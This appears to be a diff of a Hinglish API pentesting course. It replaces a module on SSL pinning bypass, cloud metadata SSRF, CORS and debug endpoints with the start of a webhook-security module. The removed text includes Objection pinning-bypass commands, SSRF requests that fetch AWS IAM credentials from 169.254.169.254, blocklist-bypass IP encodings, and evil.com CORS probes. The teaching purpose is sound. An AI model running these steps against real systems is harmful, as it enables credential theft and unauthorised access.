@@ -5337,704 +5337,1127 @@ Attacker -> Request with X-Forwarded-Host: evil.com -> Server generates response
 
 ========================================================================================
 
-## 🌐 Module 7: Infrastructure & Misconfiguration (Mobile & Cloud)
-
-Yeh module mobile applications (Android/iOS) mein API interception, cloud environments (AWS/Azure/GCP) ki common vulnerabilities, aur infrastructure-level misconfigurations (CORS, caching, headers) ke baare mein hai. Yahan hum seekhenge ki mobile app mein SSL pinning ko kaise bypass karein, cloud metadata se sensitive keys kaise churaayein, CORS misconfig se user data kaise leak karein, aur cache poisoning se malicious content kaise serve karwayein. Chaliye har topic ko detail mein samajhte hain.
+# 🔗 Module 8: Webhook Security & Microservices
 
 ---
 
-### 🎯 Topic 7.1: Mobile API Interception (SSL Pinning Bypass)
+## Topic 8.1: Webhook Security
 
-#### 1. 🎯 Title
-**Mobile API Interception (SSL Pinning Bypass)**
+### 1. 🎯 Title
+Webhook Security – Signature Verification, Replay Attacks, aur SSRF
 
-#### 2. 🐣 Samjhane ke liye (Analogy)
-Sochiye aap kisi ke ghar mein chhup ke baat sunna chahte ho. Ghar ke darwaaze par ek special lock hai jo sirf ghar waalon ki chaabi se khulta hai (SSL pinning). Aap apni chaabi (Burp certificate) se lock nahi khol sakte. Ab aap ek "master key" banate ho jo lock ki andaruni mechanism ko hi disable kar deta hai—jaise Frida/Objection se pinning function ko hi hatana. Phir aap apni chaabi se lock khol kar andar ki baatein sun sakte ho (traffic intercept).
+### 2. 🐣 Samjhane ke liye (Analogy)
+Maan lo tum ek **chaiwala** ho. Tumhare paas ek **order book** hai jisme log chai order karte hain. Jab koi order deta hai, tum apne **helper** ko bhejkar usse chai pahunchaate ho.
 
-#### 3. 📖 Technical Definition
-SSL pinning ek security mechanism hai jisme mobile app sirf specific SSL/TLS certificates ya public keys ko trust karti hai, na ki system ke certificate store par bharosa karti hai. Isse man-in-the-middle (MITM) attacks mushkil ho jaate hain, kyunki proxy tools (Burp, ZAP) ke certificates app reject kar deti hai. SSL pinning bypass ka matlab hai app ke code mein changes kiye bina, runtime pe pinning logic ko disable karna, taaki hum proxy certificate se traffic intercept kar saken.
+Ab helper ek **webhook** ki tarah hai – wo tumhara **callback** hai jo order complete hone ki **update** tumhe deta hai (e.g., "Order #5 deliver ho gaya").
 
-#### 4. 🧠 Zaroorat Kyun Hai?
-Mobile app pentesting ke dauran humein API requests/responses dekhne hote hain. Agar SSL pinning enabled hai, toh humara proxy ka certificate kaam nahi karega. Isliye pinning bypass karna zaroori hai taaki hum app ke traffic ko intercept kar ke vulnerabilities (IDOR, injections, etc.) identify kar saken.
+**Lekin agar helper ki identity verify nahi karte**, toh koi bhi **fake helper** aake bol sakta hai "Order #5 deliver ho gaya" – aur tum order ko complete mark kar doge, bina actual delivery ke. Yahi hai **webhook signature verification ki kami**.
 
-#### 5. 🔍 Visual - Screen Par Kya Dikhega
-- Normal scenario: Burp proxy set karne ke baad app open karte hi error aata hai: "Network error", "SSL handshake failed", ya blank screen. Kuch apps to open hi nahi hoti.
-- Bypass ke baad: App normal chal rahi hai, aur Burp mein saari requests dikh rahi hain (jaise `POST /api/login`, `GET /api/profile` etc.)
+Aur agar helper ke paas **timestamp** nahi hai, toh wo wahi message baar baar bhej ke tumhe **replay** kar sakta hai (same order multiple times complete). 
 
-#### 6. ⚙️ Under the Hood
-SSL pinning typically implement hota hai:
-- **Android:** Network security config (XML) ya code mein `TrustManager`/`OkHttp` ke through.
-- **iOS:** `URLSession` ke `delegate` methods mein certificate validation.
+Webhook URL mein agar tumne **internal address** daal diya, toh helper tumhare **server ko internal request** bhej dega – yahi **SSRF** hai.
 
-Frida ek dynamic instrumentation tool hai jo running process mein JavaScript inject karta hai. Objection Frida par based runtime mobile exploration tool hai. `android sslpinning disable` command Frida scripts use karti hai jo common pinning implementations ko hook kar ke bypass kar deti hai (jaise `checkServerTrusted` method ko override karna).
+### 3. 📖 Technical Definition
+**Webhook** ek user-defined HTTP callback hota hai jo kisi event ke trigger hone par ek service se dusre service ko real-time data bhejta hai. Webhook security ensure karta hai ki:
+- Incoming webhook **genuine sender** se aaya hai (signature verification)
+- Webhook request **fresh** hai, purana nahi (replay protection)
+- Webhook URL safe hai, internal resources target nahi kar raha (SSRF prevention)
 
-#### 7. 💻 Hands-On Step-by-Step
-**Prerequisites:**
-- Android/iOS device/emulator with USB debugging enabled.
-- Frida installed on PC: `pip install frida-tools`
-- Objection installed: `pip install objection`
-- Burp Suite with proxy set on same network.
+### 4. 🧠 Zaroorat Kyun Hai?
+- Agar signature verify nahi kiya toh koi bhi **fake event** trigger kar sakta hai – jaise payment success, user delete, etc.
+- Replay attack se duplicate actions ho sakte hain (double payment, multiple emails)
+- SSRF se internal network scan, metadata leak, ya internal services compromise ho sakti hain
 
-**Step 1 (Android):**
-- Connect device: `adb devices` se list ho.
-- App package name pata karo: `frida-ps -U` ya `adb shell pm list packages | grep <app_name>`.
-- Start objection for the app:
-  ```
-  objection --gadget "com.example.app" explore
-  ```
-- Objection console open hoga. Wahan command run karo:
-  ```
-  android sslpinning disable
-  ```
-- Alternatively, agar app already running hai toh objection attach kar sakte ho:
-  ```
-  objection -g com.example.app explore
-  ```
-
-**Step 2 (iOS):**
-- Jailbroken device ya FridaGadget injected IPA.
-- Objection se attach:
-  ```
-  objection -g "AppName" explore
-  ```
-- Command:
-  ```
-  ios sslpinning disable
-  ```
-
-**Step 3:** Ab app mein koi action perform karo (login, etc.). Burp mein requests aane lagenge.
-
-**Step 4 (Alternative method without Frida):**
-- Android emulator mein proxy set karo (WiFi settings → Manual proxy → Burp IP).
-- Install ProxyDroid app, usme proxy configure karo (Burp IP, port).
-- ProxyDroid mein "Global Proxy" enable karo. Isse saara traffic Burp se hokar jayega, lekin SSL pinning bypass nahi hoga; agar app pinning karti hai toh bhi error aayega. ProxyDroid sirf system-wide proxy provide karta hai, pinning bypass nahi. Isliye Frida/Objection better hai.
-
-**Hardcoded Keys Dhundhna:**
-- APK file decompile karo:
-  ```
-  apktool d app.apk
-  ```
-- `res/values/strings.xml` mein API keys, Firebase URLs dhoondo.
-- Source code (smali) mein bhi grep karo: `grep -r "api_key" .` ya `grep -r "https://" .`
-
-#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
-- **Success:** Burp mein app ke saare HTTPS requests dikh rahe hain, koi SSL error nahi.
-- **Failure:** App still shows network error, ya Burp mein kuch nahi aata.
-
-#### 9. ⚖️ Comparison (SSL Pinning vs Certificate Pinning)
-| SSL Pinning | Certificate Pinning (Strict) |
-|-------------|------------------------------|
-| Usually refers to pinning the server's certificate or public key | Same concept, but sometimes pinning the exact certificate, not just public key |
-| Can be bypassed by hooking validation methods | Harder to bypass if public key pinning, but still possible with Frida |
-
-#### 10. 🚫 Common Mistakes
-- **Mistake:** Objection command fail ho rahi hai kyunki app debuggable nahi hai. **Fix:** Android ke liye, app ko repack karke android:debuggable=true set karo, ya rooted device use karo.
-- **Mistake:** Burp certificate install karna bhoolna. **Fix:** Burp CA certificate device mein install karo (Settings → Security → Install from SD card).
-- **Mistake:** iOS par non-jailbroken device mein objection use karna. **Fix:** Jailbreak ya FridaGadget injected IPA bana lo.
-
-#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
-- **Q:** Kya SSL pinning bypass ke baad app detect kar legi ki modified hai?
-  **A:** App runtime detection kar sakti hai (root detection, Frida detection). Uske liye additional bypass techniques chahiye (objection ke `android root disable` etc.).
-- **Q:** Kya yeh sab legal hai?
-  **A:** Apne app ke pentest ke liye allowed hai. Bina permission kisi aur ka app break karna illegal hai.
-
-#### 12. 🌍 Real-World Use Case
-**Bug Bounty Example:** Ek banking app mein SSL pinning thi. Hacker ne Frida script likh kar pinning bypass kiya, phir traffic dekha to ek endpoint `GET /api/transactions` par user ID parameter tha jo change karke doosre users ka transaction history leak ho raha tha (IDOR). Yeh vulnerability critical thi kyunki bina bypass ke pata nahi chal paata.
-
-#### 13. 🎨 Visual Diagram (ASCII Art)
+### 5. 🔍 Visual - Screen Par Kya Dikhega (Burp Suite)
+**Webhook request kuch aisa dikhega:**
 ```
-Mobile App (with pinning) --> Frida/Objection (hooks validation) --> Burp Proxy --> Server
-```
-
-#### 14. 🛠️ Best Practices (Pro Tips)
-- **Pro Tip 1:** Frida script se pinning bypass ke alawa certificate pinning log ko dump bhi kar sakte ho.
-- **Pro Tip 2:** Agar objection ka `android sslpinning disable` kaam nahi kar raha, toh custom Frida script use karo jo specific library (OkHttp, HttpURLConnection) target kare.
-- **Pro Tip 3:** Hardcoded keys dhundhne ke liye `apktool` ke baad `grep -rE "api[_-]?key|secret|token|firebase"` karo.
-
-#### 15. ❓ FAQ (Interview Questions)
-- **Q1:** SSL pinning ka purpose kya hai?
-  **A:** MITM attacks se bachna, even if device mein rogue CA installed ho.
-- **Q2:** Frida kaise kaam karta hai?
-  **A:** Frida target process mein JavaScript engine inject karta hai aur uski memory mein functions ko hook kar leta hai.
-- **Q3:** SSL pinning bypass ke alternate tareeke?
-  **A:** App repack karke pinning code remove karna, ya patching binary (iOS), ya object file modification.
-
-#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
-**"Pinning laga ho to Frida laga, objection se bypass kar, Burp mein traffic dekh."**
-
----
-
-### 🎯 Topic 7.2: Cloud-Native API Risks (AWS/Azure/GCP)
-
-#### 1. 🎯 Title
-**Cloud-Native API Risks (Metadata SSRF, S3 Leakage, Serverless Risks)**
-
-#### 2. 🐣 Samjhane ke liye (Analogy)
-Sochiye aapke ghar ka safe (cloud server) hai. Uski ek secret diary hai jisme saari passwords likhi hain—yeh diary sirf ghar ke andar se padhi ja sakti hai (metadata service). Agar koi chor (attacker) aapke ghar mein ghus kar koi cheez (SSRF) aapki diary tak pahuncha de, toh wo passwords padh lega. Yahi metadata SSRF hai. Ab maan lo aapne apni almirah (S3 bucket) khuli chhod di, to koi bhi andar ka samaan dekh sakta hai. Aur serverless lambda? Wo aapke robot ki tarah kaam karta hai, lekin agar robot ko galat instructions (event injection) de do to wo kuch bhi kar dega.
-
-#### 3. 📖 Technical Definition
-- **Metadata SSRF:** Cloud providers (AWS, Azure, GCP) instance ke andar ek internal metadata service hoti hai (169.254.169.254) jo instance ke baare mein sensitive info deti hai (IAM roles, credentials). SSRF vulnerability ke through attacker is internal endpoint ko hit kar ke temporary AWS keys le sakta hai.
-- **S3 Bucket Leakage:** Agar API response mein S3 URLs expose ho rahe hain (jaise image URLs), aur bucket misconfigured hai (public read), toh attacker sensitive files download kar sakta hai.
-- **Serverless (Lambda) Risks:** Lambda functions event-based hote hain. Agar input validation na ho, toh attacker crafted JSON event bhej kar function ke behavior ko change kar sakta hai (event injection), jaise database query modify karna.
-
-#### 4. 🧠 Zaroorat Kyun Hai?
-Cloud misconfigurations se bada data leak ho sakta hai. Metadata SSRF se attacker cloud environment compromise kar sakta hai. S3 leaks se sensitive user data public ho jata hai. Lambda risks se business logic bypass ho sakta hai.
-
-#### 5. 🔍 Visual - Screen Par Kya Dikhega
-**Metadata SSRF:**
-- Koi endpoint jo external URL fetch karta ho (e.g., `GET /fetch?url=http://example.com`).
-- SSRF test: `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-- Response mein agar IAM role name aur keys aa jayein, toh vulnerable.
-
-**S3 Leakage:**
-- API response mein kuch aisa dikhe: `"profile_pic": "https://s3.amazonaws.com/company-users-bucket/123.jpg"`
-- Agar bucket public hai, toh directly URL open kar ke image dekh sakte hain. Aur directory listing? Try `https://s3.amazonaws.com/company-users-bucket/` — agar listing aayi toh aur files milengi.
-
-**Serverless:**
-- Lambda function ke URL par POST request bhej kar data modify karna. Jaise event mein extra fields daalna.
-
-#### 6. ⚙️ Under the Hood
-**Metadata SSRF:**
-AWS EC2 instance par metadata service IP `169.254.169.254` hota hai. Role credentials ka path `/latest/meta-data/iam/security-credentials/<role-name>/` hota hai. `169.254.169.254` ke alawa AWS ke paas `169.254.169.253` (DNS) bhi hota hai.
-
-**S3 Bucket:**
-S3 bucket URLs format: `https://<bucket-name>.s3.amazonaws.com/` ya `https://s3.amazonaws.com/<bucket-name>/`. Agar bucket ACL public-read hai toh koi bhi list/read kar sakta hai.
-
-**Serverless:**
-Lambda functions triggered by events (API Gateway, S3, etc.). Agar function mein event object parse karte waqt validation nahi hai, toh attacker malicious fields inject kar ke logic affect kar sakta hai.
-
-#### 7. 💻 Hands-On Step-by-Step
-**Metadata SSRF:**
-
-**Step 1:** Koi aisa endpoint dhoondo jo URL parameter leta ho (image fetch, webhook, etc.). Jaise:
-```
-GET /api/avatar?url=https://example.com/image.jpg
-```
-**Step 2:** Burp Repeater mein URL change karo internal IP:
-```
-GET /api/avatar?url=http://169.254.169.254/latest/meta-data/
-```
-Response mein kuch aaye jaise `ami-id`, `instance-id`, etc.
-
-**Step 3:** Phir IAM credentials dhundho:
-```
-GET /api/avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
-```
-Response mein role name milega (e.g., `my-role`).
-
-**Step 4:** Us role ke credentials le lo:
-```
-GET /api/avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role
-```
-Response JSON format mein temporary AWS keys (AccessKeyId, SecretAccessKey, Token) milega.
-
-**S3 Leakage:**
-
-**Step 1:** API response mein koi S3 URL dhundo.
-
-**Step 2:** Us URL ko browser mein open karo. Agar file download ho jaye, toh bucket public hai.
-
-**Step 3:** Directory listing check karo: remove filename, only bucket path. Jaise `https://s3.amazonaws.com/company-users-bucket/` — agar XML listing aayi, toh aur files milengi.
-
-**Step 4:** Listing na bhi ho, to common file names brute-force kar sakte ho.
-
-**Serverless Event Injection:**
-
-**Step 1:** Lambda function endpoint ko identify karo (e.g., `POST /api/order`).
-
-**Step 2:** Normal request bhejo:
-```
-{"item":"laptop", "quantity":1}
-```
-**Step 3:** Extra fields inject karo, jaise `"admin":true`, `"price":0`. Dekho response mein kya farak padta hai.
-
-#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
-- **Metadata SSRF Success:** IAM credentials mil gaye.
-- **Metadata SSRF Failure:** Error "Connection refused" ya "Invalid URL".
-- **S3 Leakage Success:** File download ya directory listing visible.
-- **S3 Leakage Failure:** `403 AccessDenied`.
-- **Serverless Success:** Function ne unexpected behavior dikhaya (e.g., admin action perform kar diya).
-
-#### 9. ⚖️ Comparison (Metadata SSRF vs S3 Leakage)
-| Metadata SSRF | S3 Leakage |
-|---------------|------------|
-| Cloud instance ke andar ka data | Public cloud storage |
-| Credentials churaana | Files churaana |
-| Requires SSRF vulnerability | Requires misconfigured bucket |
-
-#### 10. 🚫 Common Mistakes
-- **Mistake:** Sirf `169.254.169.254` try karna, lekin cloud providers ke paas doosre IP bhi hote hain (e.g., GCP metadata `169.254.169.254` same; Azure `169.254.169.254` also works). Lekin Azure ke paas alag endpoint bhi hai: `168.63.129.16`.
-- **Mistake:** IAM credentials expire ho jaate hain, lekin attacker use kar sakta hai immediate attacks.
-- **Mistake:** S3 bucket listing band ho, lekin file names guess kiye ja sakte hain (e.g., user IDs). Isliye file enumeration bhi try karo.
-
-#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
-- **Q:** SSRF se metadata hit karne ke liye request external ho ya internal? Server side request hogi, to internal IP accessible hoga.
-- **Q:** Kya metadata service sabhi cloud providers mein same IP hai?
-  **A:** AWS, GCP, Azure (most) use `169.254.169.254`. Azure ke paas alag IP bhi hai.
-- **Q:** Agar bucket public hai toh kya koi bhi file dekh sakta hai?
-  **A:** Ha agar object ACL public hai. Directory listing bucket ki setting par depend karta hai.
-
-#### 12. 🌍 Real-World Use Case
-**Capital One Breach (2019):** Attacker ne SSRF vulnerability exploit kiya EC2 metadata se IAM credentials le liye, phir S3 buckets se 100 million+ customer records leak kar diye. Yeh cloud misconfig ka sabse bada example hai.
-
-#### 13. 🎨 Visual Diagram (ASCII Art)
-```
-Attacker -> SSRF in app -> request to 169.254.169.254 -> metadata service -> IAM keys -> Attacker uses keys to access S3
-```
-
-#### 14. 🛠️ Best Practices (Pro Tips)
-- **Pro Tip 1:** Metadata SSRF ke liye blocklist bypass karo: `http://[::169.254.169.254]`, `http://0xA9.0xFE.0xA9.0xFE`, ya `http://169.254.169.254.nip.io/`.
-- **Pro Tip 2:** S3 bucket dhundhne ke liye tools like `awscli` use karo, ya `bucketkicker` se brute-force.
-- **Pro Tip 3:** Serverless event injection ke liye fuzz karo common fields jaisa `user`, `role`, `admin`, `isAdmin`.
-
-#### 15. ❓ FAQ (Interview Questions)
-- **Q1:** AWS metadata service ka IP kya hai?
-  **A:** 169.254.169.254
-- **Q2:** SSRF se AWS keys milne ke baad attacker kya kar sakta hai?
-  **A:** Instance impersonate kar ke S3 read, EC2 start/stop, etc.
-- **Q3:** S3 bucket ko secure kaise rakhein?
-  **A:** Public access block karo, bucket policy restrict karo, aur IAM roles se access control.
-
-#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
-**"Metadata SSRF se keys chura, S3 bucket se data utha, serverless me event inject—cloud ki chhutti kar de."**
-
----
-
-### 🎯 Topic 7.3: CORS (Cross-Origin Resource Sharing) Misconfiguration
-
-#### 1. 🎯 Title
-**CORS Misconfiguration**
-
-#### 2. 🐣 Samjhane ke liye (Analogy)
-Maan lo aapka ek ghar hai (website) jisme aapne apne dost (trusted origins) ko andar aane ki permission di hai. CORS policy wahi hai—yeh batati hai ki kaunsi websites aapke API se data le sakti hain. Agar aapne "kisi ko bhi aa sakta hai" policy (wildcard `*`) laga di aur saath mein "credentials bhi de do" (cookies) bol diya, toh koi bhi hacker ki website aapke user ka data chura sakti hai. Yahi CORS misconfiguration hai.
-
-#### 3. 📖 Technical Definition
-CORS ek HTTP header-based mechanism hai jo browser ko batata hai ki kisi different origin (domain, scheme, port) se request karne ki permission hai ya nahi. Main headers: `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, `Access-Control-Allow-Methods`. Misconfiguration tab hoti hai jab:
-- `Access-Control-Allow-Origin: *` ke saath `Access-Control-Allow-Credentials: true` ho (yeh insecure hai, browser allow nahi karta actually? Specification kehta hai ki `*` ke saath credentials true nahi ho sakta, lekin servers galat implement kar sakte hain).
-- Origin reflect ho (server jo origin request mein bheja wahi allow kar de).
-- `null` origin allow karna.
-
-#### 4. 🧠 Zaroorat Kyun Hai?
-CORS misconfiguration se attacker malicious website bana kar user ka data (API responses) chura sakta hai jab user us site par aaye. Ye CSRF-type attack hai, lekin cross-origin read karna.
-
-#### 5. 🔍 Visual - Screen Par Kya Dikhega
-- Request mein `Origin: https://evil.com` header daalo.
-- Response check karo:
-  ```
-  Access-Control-Allow-Origin: https://evil.com
-  Access-Control-Allow-Credentials: true
-  ```
-- Agar aisa ho toh vulnerable.
-
-#### 6. ⚙️ Under the Hood
-Browser jab kisi different origin se request karta hai, toh preflight OPTIONS request bhejta hai (complex requests me) ya direct request me `Origin` header dalta hai. Server `Access-Control-Allow-Origin` response header me allow kare to browser response ko JavaScript ko deta hai. Agar credentials true hai aur allow-origin specific hai, toh cookies bhi bheji ja sakti hai. Agar allow-origin `*` hai aur credentials true hai toh technically browser error dega, lekin agar server aisa response de, toh browser allow kar lega? Actually spec prohibits `*` with credentials, but some browsers may ignore? Better to test.
-
-#### 7. 💻 Hands-On Step-by-Step
-**Test for Wildcard + Credentials:**
-
-**Step 1:** Target API endpoint select karo (e.g., `GET /api/user/profile`).
-
-**Step 2:** Burp Repeater mein request bhejo with `Origin: https://evil.com` header.
-
-**Step 3:** Response headers check karo. Agar:
-```
-Access-Control-Allow-Origin: *
-Access-Control-Allow-Credentials: true
-```
-Aisa combination vulnerable hai (critical).
-
-**Test for Origin Reflection:**
-
-**Step 1:** Request bhejo with `Origin: https://evil.com`.
-
-**Step 2:** Agar response mein `Access-Control-Allow-Origin: https://evil.com` milta hai, toh server origin reflect kar raha hai.
-
-**Step 3:** Ab check karo `Access-Control-Allow-Credentials: true` hai ya nahi. Agar hai, toh malicious site user data chura sakti hai.
-
-**Test for Null Origin:**
-
-**Step 1:** Request bhejo with `Origin: null` (ya to sandboxed iframe se).
-
-**Step 2:** Agar response mein `Access-Control-Allow-Origin: null` aur credentials true ho, toh vulnerable.
-
-#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
-- **Success:** Headers as above present hain.
-- **Failure:** Origin header reflect nahi hua, ya `Access-Control-Allow-Origin` missing, ya credentials false.
-
-#### 9. ⚖️ Comparison (CORS vs CSRF)
-| CORS Misconfiguration | CSRF |
-|-----------------------|------|
-| Cross-origin read capability | Cross-origin write (state change) |
-| Depends on response headers | Depends on lack of anti-CSRF tokens |
-| Attacker reads user data | Attacker performs action on behalf of user |
-
-#### 10. 🚫 Common Mistakes
-- **Mistake:** Sirf wildcard check karna. **Fix:** Origin reflection bhi check karo.
-- **Mistake:** Credentials true hone par bhi agar `*` hai toh browser allow nahi karega? But servers galat ho sakte hain, aur browser policy strict nahi bhi ho. Isliye test karo.
-- **Mistake:** Preflight OPTIONS request ko ignore karna. **Fix:** OPTIONS ka bhi response check karo.
-
-#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
-- **Q:** Kya CORS misconfiguration ka exploit karne ke liye user interaction chahiye?
-  **A:** Ha, user ko malicious website par aana hoga aur authenticated hona hoga target site par.
-- **Q:** Kya CORS sirf JavaScript se data read karne ke liye relevant hai?
-  **A:** Ha, normal browser requests (image, form) CORS se restrict nahi hote, lekin response JavaScript ko nahi milta. CORS ka goal hai controlled access.
-- **Q:** Kya `*` ke saath credentials true possible hai?
-  **A:** Spec kehti hai nahi, lekin kuch servers aisa response de sakte hain, aur browser allow kar dega? Actually browsers probably enforce spec, but vulnerable servers may have other misconfigurations like dynamic origin reflection.
-
-#### 12. 🌍 Real-World Use Case
-**Bug Bounty Example:** Facebook me ek CORS misconfiguration thi jisse `null` origin allow tha aur credentials true the. Attacker iframe sandbox se user data read kar sakta tha. Facebook ne fix kiya.
-
-#### 13. 🎨 Visual Diagram (ASCII Art)
-```
-User logs into bank.com -> visits evil.com -> evil.com JavaScript makes request to bank.com/api with Origin: evil.com -> bank.com reflects origin and sends credentials -> browser gives response to evil.com -> attacker gets user data.
-```
-
-#### 14. 🛠️ Best Practices (Pro Tips)
-- **Pro Tip 1:** CORS test ke liye Burp extension "CORS Scanner" use kar sakte ho.
-- **Pro Tip 2:** Manual testing mein `Origin` header ko rotate karo: random domains, `null`, subdomains, etc.
-- **Pro Tip 3:** Agar credentials true nahi hai, toh bhi sensitive data (non-authenticated) leak ho sakta hai.
-
-#### 15. ❓ FAQ (Interview Questions)
-- **Q1:** CORS policy ka objective kya hai?
-  **A:** Same-origin policy ko relax karte hue controlled cross-origin access dena.
-- **Q2:** `Access-Control-Allow-Origin: *` kab safe hai?
-  **A:** Jab API public ho aur credentials ki zaroorat nahi (no cookies).
-- **Q3:** CORS misconfiguration se kya attack possible hai?
-  **A:** Data theft via malicious website.
-
-#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
-**"CORS ka chakkar, origin reflect kare to data leak ka darr."**
-
----
-
-### 🎯 Topic 7.4: API Versioning & Deprecation
-
-#### 1. 🎯 Title
-**API Versioning & Deprecation**
-
-#### 2. 🐣 Samjhane ke liye (Analogy)
-Sochiye aapke ghar mein purana TV (v1) aur naya TV (v2) hai. Purane TV mein kuch defects hain (vulnerabilities). Aap ne naya TV le liya aur purane ko store room mein daal diya, lekin darwaaza band nahi kiya. Koi chor andar aa kar purane TV se defects exploit kar sakta hai. Yahi deprecated API version ka risk hai. Aur agar aapne TV ke debugging buttons (debug endpoints) khule chhod diye hain, toh koi bhi aake settings kharab kar sakta hai.
-
-#### 3. 📖 Technical Definition
-- **Debug Endpoints:** Endpoints jo sirf development ke liye hone chahiye, jaise `/api/debug`, `/api/test`, `/api/health`, `/api/status`. Agar ye production mein available hain, toh sensitive information leak ho sakti hai (server status, config, etc.).
-- **Deprecated Versions:** Jab API version upgrade hota hai, to purane versions (`/v1/`) ko band karna chahiye. Agar band nahi kiya, to unme purani vulnerabilities (jo naye version mein fix hui hain) abhi bhi exploit ki ja sakti hain.
-
-#### 4. 🧠 Zaroorat Kyun Hai?
-Deprecated versions mein unpatched vulnerabilities hoti hain. Attackers unhe target kar sakte hain. Debug endpoints se information disclosure ho sakta hai jo further attacks mein help karta hai.
-
-#### 5. 🔍 Visual - Screen Par Kya Dikhega
-- Debug endpoint hit karo: `GET /api/debug` → response mein stack trace, environment variables, etc.
-- Deprecated version try karo: `GET /v1/users` instead of `GET /v2/users`. Agar response same data de raha hai, toh deprecated version accessible hai. Check karo ki `v1` mein vulnerabilities hain (jaane ke liye).
-
-#### 6. ⚙️ Under the Hood
-- **Debug endpoints:** Developers frameworks ke debug mode ko enable kar sakte hain, jo extra info expose karta hai.
-- **Versioning:** Common patterns: `/api/v1/resource`, `/api/v2/resource`. Agar server versioning ko route level handle karta hai, toh purane versions ka code still deployed ho sakta hai.
-
-#### 7. 💻 Hands-On Step-by-Step
-**Debug Endpoints Enumeration:**
-
-**Step 1:** Common debug paths ki list bana lo:
-```
-/api/debug
-/api/test
-/api/health
-/api/status
-/api/metrics
-/api/console
-/.env
-```
-
-**Step 2:** Burp Intruder mein in paths ko fuzz karo.
-
-**Step 3:** Response dekho. Agar `200 OK` aur kuch info dikhi, toh vulnerable.
-
-**Deprecated Versions:**
-
-**Step 1:** Current version pata karo (e.g., `/api/v3/users`).
-
-**Step 2:** Version number kam karte jao: `/api/v2/users`, `/api/v1/users`, `/api/v0/users`.
-
-**Step 3:** Har version ke response compare karo. Agar same data mil raha hai (ya kuch data mil raha hai) toh version active hai.
-
-**Step 4:** Known vulnerabilities (jaise v1 mein IDOR thi) test karo.
-
-#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
-- **Debug Endpoint Success:** Response mein sensitive info (server version, paths, etc.) dikhe.
-- **Failure:** `404 Not Found`.
-- **Deprecated Version Success:** `200 OK` with data.
-- **Failure:** `404` ya `410 Gone`.
-
-#### 9. ⚖️ Comparison (Debug vs Deprecated)
-| Debug Endpoints | Deprecated Versions |
-|-----------------|---------------------|
-| Unnecessary exposure | Old code exposure |
-| Usually informational | May have known vulnerabilities |
-
-#### 10. 🚫 Common Mistakes
-- **Mistake:** Sirf `/v1/` try karna. **Fix:** `/api/v1/`, `/api/1/`, `/v1/api/`, `/1/` sab try karo.
-- **Mistake:** Debug endpoints me sirf `/debug` try karna. **Fix:** Fuzz common list.
-- **Mistake:** Versioning me patch version bhi try karo: `/v1.2/` etc.
-
-#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
-- **Q:** Kya debug endpoints se direct exploit ho sakta hai?
-  **A:** Nahi, lekin info se doosre vulnerabilities ko target karna easy ho jata hai.
-- **Q:** Agar version 2 mein bhi vulnerability ho, toh version 1 mein bhi hogi?
-  **A:** Hamesha nahi, but ho sakti hai. Test karna padega.
-
-#### 12. 🌍 Real-World Use Case
-**Uber Bug Bounty:** Uber ke API mein ` /v1/debug ` endpoint tha jo stack trace leak kar raha tha, jisse internal paths pata chale. Isse help hui doosre bugs find karne mein.
-
-#### 13. 🎨 Visual Diagram (ASCII Art)
-```
-Attacker -> /v1/users (deprecated) -> Server (old code) -> Data/Error -> Vulnerability exploit possible
-```
-
-#### 14. 🛠️ Best Practices (Pro Tips)
-- **Pro Tip 1:** Debug endpoints ki comprehensive wordlist use karo: `seclists/Discovery/Web-Content/common-api-endpoints.txt`.
-- **Pro Tip 2:** Version bypass ke liye `Accept` header bhi change karo: `Accept: application/vnd.company.v1+json`.
-- **Pro Tip 3:** Deprecated versions ke saath saath staging environment endpoints bhi check karo (e.g., `staging-api.target.com`).
-
-#### 15. ❓ FAQ (Interview Questions)
-- **Q1:** API versioning ke common tareeke kya hain?
-  **A:** URI path (`/v1/`), subdomain (`v1.api.`), query parameter (`?version=1`), header (`Accept: version=1`).
-- **Q2:** Deprecated versions ko safely handle karne ka tarika?
-  **A:** Unko permanently disable karo, ya `410 Gone` response do, aur documentation mein remove karo.
-- **Q3:** Debug endpoints se kya leak ho sakta hai?
-  **A:** Server version, environment variables, internal IPs, stack traces, configuration details.
-
-#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
-**"Debug khola, version purana—dono hi hacker ke liye sahara."**
-
----
-
-### 🎯 Topic 7.5: Security Headers & Verbose Errors
-
-#### 1. 🎯 Title
-**Security Headers & Verbose Errors**
-
-#### 2. 🐣 Samjhane ke liye (Analogy)
-Jaise aap apne ghar ke darwaaze par tala lagate ho, aur khidki par grills lagate ho. Security headers woh grills hain—HSTS (Strict-Transport-Security) force karta hai ki sab log HTTPS se aaye, CSP (Content-Security-Policy) batata hai ki kaunsi scripts chale, X-Content-Type-Options prevent karta hai browser ko file type galat interpret karne se. Verbose errors matlab agar koi galat chaabi daale to aap poora lock ka mechanism bata do—ki "yeh gear galat hai, gearbox ka model yeh hai". Isse attacker ko helpful info mil jaati hai.
-
-#### 3. 📖 Technical Definition
-- **Security Headers:** HTTP response headers jo browser/client ko specific security behaviors enforce karne ke liye bheje jaate hain. Common:
-  - `Strict-Transport-Security` (HSTS): Browser ko force karta hai ki future requests sirf HTTPS par jayein.
-  - `Content-Security-Policy` (CSP): Controls resources (scripts, styles) kis source se load ho sakte hain.
-  - `X-Content-Type-Options: nosniff`: Browser ko MIME type sniffing se rokta hai.
-  - `X-Frame-Options`: Clickjacking se bachata hai.
-  - `Referrer-Policy`: Referrer header control.
-- **Verbose Error Messages:** Jab server galat input par detailed error de (stack trace, DB error, internal path, etc.), jo attacker ko system ki jaankari de.
-
-#### 4. 🧠 Zaroorat Kyun Hai?
-Security headers missing ho to client-side attacks (XSS, clickjacking, MITM) asaan ho jaate hain. Verbose errors se information disclosure hota hai, jo further attacks mein madadgar hai.
-
